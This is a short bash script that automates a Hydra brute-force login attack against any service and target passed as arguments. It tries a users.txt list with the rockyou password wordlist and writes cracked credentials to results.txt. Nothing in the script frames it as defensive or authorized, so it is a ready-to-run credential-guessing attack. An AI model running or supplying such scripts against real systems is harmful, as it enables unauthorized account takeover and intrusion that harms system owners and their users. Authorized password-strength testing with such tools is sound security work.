#!/bin/bash

# Hydra brute force automation script

target=$1
service=$2

echo "Starting brute force attack on $service at $target..."

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -e nsr $service://$target -o results.txt

echo "Attack completed."
echo "Results saved in results.txt"
